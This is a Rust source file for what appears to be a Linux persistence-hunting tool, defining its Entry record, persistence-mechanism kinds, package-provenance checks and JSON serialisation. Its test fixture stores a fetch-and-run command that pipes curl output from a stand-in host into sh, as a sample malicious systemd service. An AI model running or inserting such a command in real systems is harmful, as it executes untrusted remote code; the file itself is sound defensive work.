//! The Entry record: the one struct every collector emits and everything
//! downstream reads. Its JSON form is the project's compatibility contract,
//! so the serialisation is written by hand rather than derived.

use std::collections::BTreeMap;
use std::ffi::OsStr;
use std::os::unix::ffi::{OsStrExt, OsStringExt};
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use serde::de::{self, MapAccess, Visitor};
use serde::ser::SerializeMap;
use serde::{Deserialize, Deserializer, Serialize, Serializer};

macro_rules! str_enum {
    ($name:ident { $($variant:ident => $text:literal),+ $(,)? }) => {
        #[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
        pub enum $name { $($variant),+ }

        impl $name {
            pub const ALL: &'static [$name] = &[$($name::$variant),+];

            pub fn as_str(self) -> &'static str {
                match self { $($name::$variant => $text),+ }
            }

            pub fn parse(s: &str) -> Option<Self> {
                match s { $($text => Some($name::$variant),)+ _ => None }
            }
        }

        impl std::fmt::Display for $name {
            fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                f.write_str(self.as_str())
            }
        }

        impl Serialize for $name {
            fn serialize<S: Serializer>(&self, s: S) -> Result<S::Ok, S::Error> {
                s.serialize_str(self.as_str())
            }
        }

        impl<'de> Deserialize<'de> for $name {
            fn deserialize<D: Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
                let s = String::deserialize(d)?;
                $name::parse(&s).ok_or_else(|| de::Error::custom(
                    format!(concat!("unknown ", stringify!($name), ": {}"), s)))
            }
        }
    };
}

str_enum!(Kind {
    SystemdUnit => "systemd_unit",
    SystemdTimer => "systemd_timer",
    SystemdGenerator => "systemd_generator",
    Cron => "cron",
    AtJob => "at_job",
    XdgAutostart => "xdg_autostart",
    ShellProfile => "shell_profile",
    Pam => "pam",
    Udev => "udev",
    RcLocal => "rc_local",
    SysvInit => "sysv_init",
    SshAuthorizedKey => "ssh_authorized_key",
    Sudoers => "sudoers",
    LdPreload => "ld_preload",
    KernelModule => "kernel_module",
    PkgHook => "pkg_hook",
    Motd => "motd",
    NetworkDispatcher => "network_dispatcher",
    DbusService => "dbus_service",
    DesktopExtension => "desktop_extension",
    SuidBinary => "suid_binary",
    FileCapability => "file_capability",
    GitHook => "git_hook",
    Tmpfiles => "tmpfiles",
    SudoPlugin => "sudo_plugin",
    PolkitRule => "polkit_rule",
    PolkitAction => "polkit_action",
    InetdService => "inetd_service",
    LibraryDir => "library_dir",
    KernelCallout => "kernel_callout",
    SystemdPreset => "systemd_preset",
    NssModule => "nss_module",
});

str_enum!(Trigger {
    Boot => "boot",
    Login => "login",
    Auth => "auth",
    Schedule => "schedule",
    DeviceEvent => "device-event",
    NetworkEvent => "network-event",
    PackageOp => "package-op",
    Always => "always",
});

str_enum!(Enablement {
    Enabled => "enabled",
    Disabled => "disabled",
    Static => "static",
    Masked => "masked",
    NotApplicable => "not-applicable",
    Unknown => "unknown",
});

str_enum!(Flag {
    Unpackaged => "unpackaged",
    PackagedModified => "packaged-modified",
    ConffileModified => "conffile-modified",
    TargetMissing => "target-missing",
    TargetUnresolvable => "target-unresolvable",
    WorldWritable => "world-writable",
    OwnerMismatch => "owner-mismatch",
    HiddenPath => "hidden-path",
    NonStandardLocation => "non-standard-location",
    ShadowsVendorUnit => "shadows-vendor-unit",
    DegradedEnablement => "degraded-enablement",
    EncodingAnomaly => "encoding-anomaly",
    WritableSearchPath => "writable-search-path",
});

str_enum!(Integrity {
    Intact => "intact",
    Modified => "modified",
    // The contents match; the setuid or setgid bits do not (rpm -V's "M").
    ModeModified => "mode-modified",
    ConffileModified => "conffile-modified",
    Unknown => "unknown",
});

/// Which package, if any, claims the file an entry was read from.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "verdict", rename_all = "kebab-case")]
pub enum Provenance {
    Packaged { package: String, version: String, integrity: Integrity },
    /// Produced at runtime by a named component — snapd, cloud-init, a systemd
    /// generator. Neither packaged nor attacker-authored.
    GeneratedBy { by: String },
    /// No package owns the file, but it is byte for byte what `by` makes from
    /// files that are packaged and intact: a template a maintainer script
    /// copied, a stack pam-auth-update assembled. As trustworthy as those.
    Reproduced { by: String },
    Unpackaged,
    Unknown,
}

impl Provenance {
    /// The suppression test of §8: hidden by default only when a package owns
    /// the file and its contents still match the manifest.
    pub fn is_packaged_intact(&self) -> bool {
        matches!(self, Provenance::Packaged { integrity: Integrity::Intact, .. })
    }

    /// Packaged and intact, or reproduced exactly from files that are.
    pub fn is_verified(&self) -> bool {
        self.is_packaged_intact() || matches!(self, Provenance::Reproduced { .. })
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Entry {
    pub id: String,
    pub kind: Kind,
    pub source: PathBuf,
    pub name: String,
    pub command: Option<Vec<u8>>,
    pub target_path: Option<PathBuf>,
    pub target_sha256: Option<String>,
    pub enabled: Enablement,
    pub trigger: Trigger,
    pub principal: Option<String>,
    pub owner_uid: u32,
    pub mode: u32,
    pub mtime: Option<SystemTime>,
    pub provenance: Provenance,
    pub flags: Vec<Flag>,
    pub raw: BTreeMap<String, String>,
}

impl Entry {
    pub fn new(kind: Kind, source: impl Into<PathBuf>, name: impl Into<String>) -> Entry {
        let source = source.into();
        let name = name.into();
        Entry {
            id: entry_id(kind, &source, &name),
            kind,
            source,
            name,
            command: None,
            target_path: None,
            target_sha256: None,
            enabled: Enablement::Unknown,
            trigger: Trigger::Boot,
            principal: None,
            owner_uid: 0,
            mode: 0,
            mtime: None,
            provenance: Provenance::Unknown,
            flags: Vec::new(),
            raw: BTreeMap::new(),
        }
    }

    pub fn flag(&mut self, f: Flag) {
        if !self.flags.contains(&f) {
            self.flags.push(f);
        }
    }

    pub fn has_flag(&self, f: Flag) -> bool {
        self.flags.contains(&f)
    }

    pub fn note(&mut self, key: &str, value: impl Into<String>) {
        self.raw.insert(key.to_string(), value.into());
    }

    /// Re-keys the entry on its path within the scan root. Callers that know
    /// the root use this; `new` alone cannot, since an Entry carries no idea
    /// of where the scan started.
    pub fn rekey(&mut self, rel: &Path) {
        self.id = entry_id(self.kind, rel, &self.name);
    }

    /// As `rekey`, for an entry synthesised out of the one whose id is given.
    pub fn rekey_declared(&mut self, rel: &Path, declared_by: &str) {
        self.id = declared_entry_id(self.kind, rel, &self.name, declared_by);
    }

    /// What the human table shows: unique-prefix addressing, git style.
    pub fn short_id(&self) -> &str {
        &self.id[..12.min(self.id.len())]
    }
}

/// Identity is `kind || source || name`, length-framed so that no two distinct
/// field splits can produce the same hash input. Content is excluded on
/// purpose: an edited backdoor must diff as Changed, not as remove-plus-add.
///
/// The source here is the path *within the scan root*, not the path as
/// reported. Hashing the reported path would mean the same host scanned live
/// and then again as a mounted image produced two different ids for every
/// entry, so the two could never be diffed against each other — which is the
/// comparison an incident responder most wants to make.
pub fn entry_id(kind: Kind, source: &Path, name: &str) -> String {
    id_of(&[kind.as_str().as_bytes(), source.as_os_str().as_bytes(), name.as_bytes()])
}

/// The id of an entry synthesised out of another. The entry that declared it
/// is part of what makes it one fact: two cron lines in one file can each
/// start /tmp/evil, on different schedules, and those are two findings.
pub fn declared_entry_id(kind: Kind, source: &Path, name: &str, declared_by: &str) -> String {
    id_of(&[kind.as_str().as_bytes(), source.as_os_str().as_bytes(), name.as_bytes(), declared_by.as_bytes()])
}

fn id_of(parts: &[&[u8]]) -> String {
    let mut h = blake3::Hasher::new();
    for part in parts {
        h.update(&(part.len() as u64).to_le_bytes());
        h.update(part);
    }
    h.finalize().to_hex().to_string()
}

/// Gives the second and later holders of one id a suffixed name and a fresh
/// id. Two textually identical rules are two entries, and a duplicate id would
/// make the diff refuse to compare scans at all.
pub fn dedup_ids(entries: &mut [Entry]) {
    let mut seen: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    let mut next: std::collections::BTreeMap<String, u32> = std::collections::BTreeMap::new();
    for e in entries.iter_mut() {
        if seen.insert(e.id.clone()) {
            continue;
        }
        // The counter is remembered per name so that a file of ten thousand
        // identical lines costs one hash each, not one per earlier duplicate.
        let counter = next.entry(format!("{}\u{1}{}", e.source.display(), e.name)).or_insert(2);
        loop {
            let name = format!("{}#{counter}", e.name);
            *counter += 1;
            let id = entry_id(e.kind, &e.source, &name);
            if seen.insert(id.clone()) {
                e.name = name;
                e.id = id;
                break;
            }
        }
    }
}

/// Bytes off a hostile disk, rendered for JSON: a string where the bytes are
/// valid UTF-8, an array of byte values where they are not. Every such field
/// carries a sibling `_utf8` boolean so a consumer never has to guess.
fn put_bytes<S: SerializeMap>(map: &mut S, key: &'static str, bytes: &[u8]) -> Result<(), S::Error>
where
    S::Error: serde::ser::Error,
{
    match std::str::from_utf8(bytes) {
        Ok(s) => map.serialize_entry(key, s)?,
        Err(_) => map.serialize_entry(key, bytes)?,
    }
    map.serialize_entry(&format!("{key}_utf8"), &std::str::from_utf8(bytes).is_ok())
}

fn unix_secs(t: SystemTime) -> i64 {
    match t.duration_since(UNIX_EPOCH) {
        Ok(d) => d.as_secs() as i64,
        Err(e) => -(e.duration().as_secs() as i64),
    }
}

impl Serialize for Entry {
    fn serialize<S: Serializer>(&self, ser: S) -> Result<S::Ok, S::Error> {
        let mut m = ser.serialize_map(None)?;
        m.serialize_entry("id", &self.id)?;
        m.serialize_entry("kind", &self.kind)?;
        put_bytes(&mut m, "source", self.source.as_os_str().as_bytes())?;
        m.serialize_entry("name", &self.name)?;
        match &self.command {
            Some(c) => put_bytes(&mut m, "command", c)?,
            None => m.serialize_entry("command", &Option::<&str>::None)?,
        }
        match &self.target_path {
            Some(p) => put_bytes(&mut m, "target_path", p.as_os_str().as_bytes())?,
            None => m.serialize_entry("target_path", &Option::<&str>::None)?,
        }
        m.serialize_entry("target_sha256", &self.target_sha256)?;
        m.serialize_entry("enabled", &self.enabled)?;
        m.serialize_entry("trigger", &self.trigger)?;
        m.serialize_entry("principal", &self.principal)?;
        m.serialize_entry("owner_uid", &self.owner_uid)?;
        m.serialize_entry("mode", &self.mode)?;
        m.serialize_entry("mtime", &self.mtime.map(unix_secs))?;
        m.serialize_entry("provenance", &self.provenance)?;
        m.serialize_entry("flags", &self.flags)?;
        m.serialize_entry("raw", &self.raw)?;
        m.end()
    }
}

/// Accepts either half of the string-or-bytes encoding above.
#[derive(Deserialize)]
#[serde(untagged)]
enum Raw {
    Text(String),
    Bytes(Vec<u8>),
}

impl From<Raw> for Vec<u8> {
    fn from(r: Raw) -> Vec<u8> {
        match r {
            Raw::Text(s) => s.into_bytes(),
            Raw::Bytes(b) => b,
        }
    }
}

fn to_path(r: Raw) -> PathBuf {
    PathBuf::from(std::ffi::OsString::from_vec(r.into()))
}

impl<'de> Deserialize<'de> for Entry {
    fn deserialize<D: Deserializer<'de>>(d: D) -> Result<Entry, D::Error> {
        struct V;

        impl<'de> Visitor<'de> for V {
            type Value = Entry;

            fn expecting(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                f.write_str("an unbidden entry record")
            }

            fn visit_map<M: MapAccess<'de>>(self, mut m: M) -> Result<Entry, M::Error> {
                let mut id = None;
                let mut kind = None;
                let mut source = None;
                let mut name = None;
                let mut command = None;
                let mut target_path = None;
                let mut target_sha256 = None;
                let mut enabled = None;
                let mut trigger = None;
                let mut principal = None;
                let mut owner_uid = None;
                let mut mode = None;
                let mut mtime: Option<Option<i64>> = None;
                let mut provenance = None;
                let mut flags = None;
                let mut raw = None;

                while let Some(key) = m.next_key::<String>()? {
                    match key.as_str() {
                        "id" => id = Some(m.next_value()?),
                        "kind" => kind = Some(m.next_value()?),
                        "source" => source = Some(to_path(m.next_value()?)),
                        "name" => name = Some(m.next_value()?),
                        "command" => {
                            command = m.next_value::<Option<Raw>>()?.map(Vec::from);
                        }
                        "target_path" => target_path = m.next_value::<Option<Raw>>()?.map(to_path),
                        "target_sha256" => target_sha256 = m.next_value()?,
                        "enabled" => enabled = Some(m.next_value()?),
                        "trigger" => trigger = Some(m.next_value()?),
                        "principal" => principal = m.next_value()?,
                        "owner_uid" => owner_uid = Some(m.next_value()?),
                        "mode" => mode = Some(m.next_value()?),
                        "mtime" => mtime = Some(m.next_value()?),
                        "provenance" => provenance = Some(m.next_value()?),
                        "flags" => flags = Some(m.next_value()?),
                        "raw" => raw = Some(m.next_value()?),
                        // Additive schema changes must not break an older reader.
                        _ => {
                            m.next_value::<serde::de::IgnoredAny>()?;
                        }
                    }
                }

                let missing = |f: &'static str| de::Error::missing_field(f);
                Ok(Entry {
                    id: id.ok_or_else(|| missing("id"))?,
                    kind: kind.ok_or_else(|| missing("kind"))?,
                    source: source.ok_or_else(|| missing("source"))?,
                    name: name.ok_or_else(|| missing("name"))?,
                    command,
                    target_path,
                    target_sha256,
                    enabled: enabled.unwrap_or(Enablement::Unknown),
                    trigger: trigger.ok_or_else(|| missing("trigger"))?,
                    principal,
                    owner_uid: owner_uid.unwrap_or(0),
                    mode: mode.unwrap_or(0),
                    mtime: mtime.flatten().map(|s| {
                        if s >= 0 {
                            UNIX_EPOCH + std::time::Duration::from_secs(s as u64)
                        } else {
                            UNIX_EPOCH - std::time::Duration::from_secs(-s as u64)
                        }
                    }),
                    provenance: provenance.unwrap_or(Provenance::Unknown),
                    flags: flags.unwrap_or_default(),
                    raw: raw.unwrap_or_default(),
                })
            }
        }

        d.deserialize_map(V)
    }
}

/// Filenames are bytes; `name` is a String. Where the two disagree the lossy
/// form is kept for display and the original bytes are preserved as evidence.
pub fn name_from_os(entry: &mut Entry, original: &OsStr) {
    if std::str::from_utf8(original.as_bytes()).is_err() {
        entry.flag(Flag::EncodingAnomaly);
        entry.note("name_raw_hex", hex(original.as_bytes()));
    }
}

pub fn hex(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        use std::fmt::Write;
        let _ = write!(s, "{b:02x}");
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample() -> Entry {
        let mut e = Entry::new(Kind::SystemdUnit, "/etc/systemd/system/evil.service", "evil.service");
        e.command = Some(b"/usr/bin/curl http://x/y | sh".to_vec());
        e.enabled = Enablement::Enabled;
        e.trigger = Trigger::Boot;
        e.provenance = Provenance::Unpackaged;
        e.flag(Flag::Unpackaged);
        e.mtime = Some(UNIX_EPOCH + std::time::Duration::from_secs(1_758_000_000));
        e
    }

    #[test]
    fn id_is_full_width_and_content_independent() {
        let mut a = sample();
        let b = sample();
        a.command = Some(b"something else entirely".to_vec());
        assert_eq!(a.id, b.id, "content must not change identity");
        assert_eq!(a.id.len(), 64, "ids are the full 256-bit hash");
        assert_eq!(a.short_id().len(), 12);
    }

    #[test]
    fn id_framing_is_unambiguous() {
        let x = entry_id(Kind::Cron, Path::new("/etc/cron.d/ab"), "c");
        let y = entry_id(Kind::Cron, Path::new("/etc/cron.d/a"), "bc");
        assert_ne!(x, y, "field boundaries must be part of the hash input");
    }

    #[test]
    fn json_roundtrip_preserves_every_field() {
        let e = sample();
        let text = serde_json::to_string(&e).unwrap();
        let back: Entry = serde_json::from_str(&text).unwrap();
        assert_eq!(e, back);
    }

    #[test]
    fn non_utf8_survives_as_bytes_not_as_replacement_chars() {
        let mut e = sample();
        e.command = Some(vec![0x2f, 0x62, 0x69, 0x6e, 0xff, 0xfe, 0x00, 0x73, 0x68]);
        e.source = PathBuf::from(std::ffi::OsString::from_vec(b"/etc/\xff\xfebad".to_vec()));
        let text = serde_json::to_string(&e).unwrap();
        assert!(text.contains("\"command_utf8\":false"));
        assert!(text.contains("\"source_utf8\":false"));
        let back: Entry = serde_json::from_str(&text).unwrap();
        assert_eq!(e, back, "hostile bytes must survive a snapshot round trip");
    }

    #[test]
    fn unknown_fields_are_ignored_so_the_schema_can_grow() {
        let mut v: serde_json::Value = serde_json::to_value(sample()).unwrap();
        v.as_object_mut().unwrap().insert("future_field".into(), serde_json::json!({"a": 1}));
        let back: Entry = serde_json::from_value(v).unwrap();
        assert_eq!(back, sample());
    }

    #[test]
    fn suppression_tests_intact_not_merely_packaged() {
        let packaged = |i| Provenance::Packaged {
            package: "openssh-server".into(),
            version: "1:9.6".into(),
            integrity: i,
        };
        assert!(packaged(Integrity::Intact).is_packaged_intact());
        assert!(!packaged(Integrity::Modified).is_packaged_intact());
        assert!(!packaged(Integrity::Unknown).is_packaged_intact());
        assert!(!Provenance::Unpackaged.is_packaged_intact());
    }
}
